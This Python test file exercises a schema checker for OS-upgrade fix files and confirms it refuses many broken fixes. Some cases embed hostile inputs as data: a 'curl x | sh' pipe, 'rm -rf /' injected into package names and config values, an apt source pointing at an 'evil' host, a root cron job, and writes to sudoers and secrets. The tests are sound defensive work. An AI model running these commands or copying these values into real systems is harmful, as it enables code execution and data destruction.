"""The gate must say no. Each case is a broken fix the schema check has to refuse.  python3 tools/test_check.py"""
import copy
import os
import sys

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import check  # noqa: E402

adapters, fixes, *_ = check.load_all()
path, good = next((p, d) for p, d in fixes.items() if p.endswith("squeeze/reinstall-mysql-server-5.1-after-hop.toml"))
rel = os.path.relpath(path, check.ROOT)
assert check.check_fix(good, adapters, rel) == [], "the seed fix should pass"

CASES = {
    "stray MySQL: install gated on a file, not on the package it replaces":
        lambda f: f.update(when={"file": "/etc/mysql/my.cnf"}),
    "install gated only under a 'not'": lambda f: f.update(when={"not": {"installed": "mariadb-server"}}),
    "arbitrary shell": lambda f: f["post"].append({"op": "shell", "cmd": "curl x | sh"}),
    "write outside /etc": lambda f: f["post"].append({"op": "write-file", "path": "/usr/bin/dpkg", "content": "x"}),
    "path traversal": lambda f: f["post"].append({"op": "write-file", "path": "/etc/../usr/bin/x", "content": "x"}),
    "write the harness's sources.list": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/apt/sources.list", "content": "deb http://evil/ x main\n"}),
    "write a cron job (code execution by the back door)": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/cron.d/x", "content": "* * * * * root sh\n"}),
    "write a subdirectory under an allowed glob": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/mysql/conf.d/x/y.cnf", "content": "x"}),
    "shell injection in a package name": lambda f: f["post"][0].update(packages=["mysql; rm -rf /"]),
    "unknown force flag": lambda f: f["post"].append(
        {"op": "force-remove", "packages": ["x"], "purge": True, "force": ["all"]}),
    "extra argument smuggled into an op": lambda f: f["post"][0].update(options="--allow-unauthenticated"),
    "hop not on the ladder": lambda f: f.update(hop="sid"),
    "unknown predicate": lambda f: f.update(when={"shell": "true"}),
    "no steps at all": lambda f: (f.pop("post"), f.pop("pre", None)),
}
bad = 0
for name, mutate in CASES.items():
    f = copy.deepcopy(good)
    mutate(f)
    errs = check.check_fix(f, adapters, rel)
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# the rpm backend's ops, on a fix built here (the gate must work before the first EL fix lands)
el_good = {"schema": "wend.fix/0", "family": "el", "hop": "alma9", "when": {"installed": "vsftpd"}, "restores": [],
           "adds": [], "post": [{"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"tcp_wrappers": "NO"}}],
           "meta": {"name": "t"}}
el_rel = "fixes/el/alma9/t.toml"
assert check.check_fix(el_good, adapters, el_rel) == [], check.check_fix(el_good, adapters, el_rel)
EL_CASES = {
    "kv.set on a file that isn't on the writable list": lambda f: f["post"][0].update(path="/etc/sudoers"),
    "shell in a kv.set value": lambda f: f["post"][0].update(values={"listen": "YES; rm -rf /"}),
    "adopt-rpmnew outside the managed list": lambda f: f["post"].append(
        {"op": "rpm.adopt-rpmnew", "paths": ["/etc/cron.d/*"]}),
    "adopt-rpmnew with a glob wider than the managed one": lambda f: f["post"].append(
        {"op": "rpm.adopt-rpmnew", "paths": ["/etc/httpd/*"]}),
    "rpm.transit reinstalling without an installed gate": lambda f: (f.update(when={"file": "/etc/my.cnf"}), f["post"].append(
        {"op": "rpm.transit", "release": "alma8", "remove": "centos-release", "reinstall": ["postfix"]})),
    "rpm.transit to a release it can't bootstrap": lambda f: f["post"].append(
        {"op": "rpm.transit", "release": "alma9", "remove": "centos-release", "reinstall": []}),
    "Debian's force flag on rpm": lambda f: f["post"].append(
        {"op": "force-remove", "packages": ["x"], "purge": True, "force": ["remove-essential"]}),
    "a Debian op on an EL box": lambda f: f["post"].append({"op": "apache.enable", "kind": "mod", "name": "php"}),
    "write the harness's repo directory": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/yum.repos.d/x.repo", "content": "[x]\n"}),
    "swap-release installing a server instead of a release package": lambda f: f["post"].append(
        {"op": "rpm.swap-release", "remove": "centos-release", "install": "mysql-server"}),
    "force-remove that drops only the database entry (fakes pkgdb)": lambda f: f["post"].append(
        {"op": "force-remove", "packages": ["mysql-server"], "purge": True, "force": ["db-only"]}),
    "kv.set a key that grants access": lambda f: f["post"][0].update(values={"anon_upload_enable": "YES"}),
    "kv.set on a file with sections": lambda f: f["post"][0].update(path="/etc/my.cnf", values={"old_passwords": "0"}),
    "write the box owner's secrets": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/wend/secrets/app-db", "content": "x"}),
    "a predicate that isn't a string": lambda f: f.update(when={"installed": 123}),
    "a value that would read as an option": lambda f: f["post"][0].update(values={"listen": "-x"}),
}
for name, mutate in EL_CASES.items():
    f = copy.deepcopy(el_good)
    mutate(f)
    errs = check.check_fix(f, adapters, el_rel)
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# adapters: an adapter can narrow what fixes may do, never widen it past its backend
for name, mutate in {
    "an adapter allowing a force flag its backend doesn't have": lambda a: a.update(force=["depends", "all"]),
    "an adapter op argument that accepts shell": lambda a: a["ops"]["kv.set"]["args"].update(
        values={"table": ".*"}),
    "an adapter declaring an op its backend doesn't implement": lambda a: a["ops"].update(
        {"shell.run": {"summary": "x", "args": {"cmd": {"pattern": "[a-z]+"}}}}),
    "an adapter without a backend": lambda a: a.pop("backend"),
}.items():
    a = copy.deepcopy(adapters["el"])
    mutate(a)
    errs = check.check_adapter(a, "adapters/el.toml")
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# a pattern can dodge any finite probe, so values are also held to a fixed safe set, whatever the adapter says
loose = copy.deepcopy(adapters)
loose["el"]["ops"]["kv.set"]["args"]["values"] = {"table": "x[a-z;|&$ ]*"}
f = copy.deepcopy(el_good)
f["post"][0]["values"] = {"listen": "x;rm"}
errs = check.check_fix(f, loose, el_rel)
print(("refused " if errs else "MISSED  ") + "shell through a loose adapter pattern" +
      (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
bad += not errs
for fam, a in adapters.items():
    errs = check.check_adapter(a, f"adapters/{fam}.toml")
    print(("passed  " if not errs else "WRONG   ") + f"adapters/{fam}.toml" + (f" ({errs})" if errs else ""))
    bad += bool(errs)
el_route = {"schema": "wend.route/0", "family": "el", "from": "centos5", "to": "alma10", "fixes": []}
for hops, want in ((["centos6", "centos7", "alma9", "alma10"], True), (["centos6", "alma9", "alma10"], False),
                   (["centos6", "centos7", "alma8", "alma9", "alma10"], True), (["centos7", "centos6", "alma10"], False)):
    ok = not check.check_route({**el_route, "hops": hops}, {}, adapters, "routes/el/x.toml")
    print(("passed  " if ok else "refused ") + f"route hops {hops}" if ok == want else f"WRONG   route hops {hops}")
    bad += ok != want

# decoys: the MySQL fix firing on the web box must fail; the honest run must pass
import json  # noqa: E402
_, fixes_, routes_, _, runs_ = check.load_all()
route = next(r for r in routes_.values() if r["family"] == "debian")
rid, by_id = check.content_id(route), {check.content_id(d): d for d in fixes_.values()}
path_, web_run = next((p, r) for p, r in runs_.items() if r["box"] == "debian/etch-web" and r["route"] == rid)
fake = json.loads(json.dumps(web_run))
next(h for h in fake["hops"] if h["to"] == "squeeze")["fired"].append(check.content_id(good))
for name, run, want in (("decoy hit: the MySQL fix fired on the web box", fake, True),
                        ("honest web run has no decoy errors", web_run, False)):
    got = bool(check.decoy_errors({path_: run}, {rid: route}, by_id))
    print(("refused " if got else "passed  ") + name if got == want else "WRONG   " + name)
    bad += got != want
assert check.content_id(good) != check.content_id({**good, "when": {"installed": "x"}})
assert check.content_id(good) == check.content_id({**good, "meta": {"name": "renamed"}}), "meta must not change ids"
print("ids: content changes the id, renaming does not")
sys.exit(1 if bad else 0)
